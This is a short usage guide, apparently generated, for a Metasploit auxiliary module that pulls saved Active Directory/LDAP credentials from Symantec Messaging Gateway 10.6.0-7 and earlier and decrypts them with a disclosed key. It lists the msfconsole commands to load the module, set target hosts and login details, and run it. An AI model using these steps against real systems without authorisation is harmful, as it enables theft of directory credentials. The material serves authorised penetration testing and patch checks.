**The description of current metasploit exploit**
This module will grab the AD account saved in Symantec Messaging Gateway and then          decipher it using the disclosed Symantec PBE key.  Note that authentication is required          in order to successfully grab the LDAP credentials, and you need at least a read account.          Version 10.6.0-7 and earlier are affected

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/symantec_brightmail_ldapcreds
```

Then set the required options:

```bash
# Required parameters with no default value
set PASSWORD <your password here>
set RHOSTS <your target hosts here>
set USERNAME <your username here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 443 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.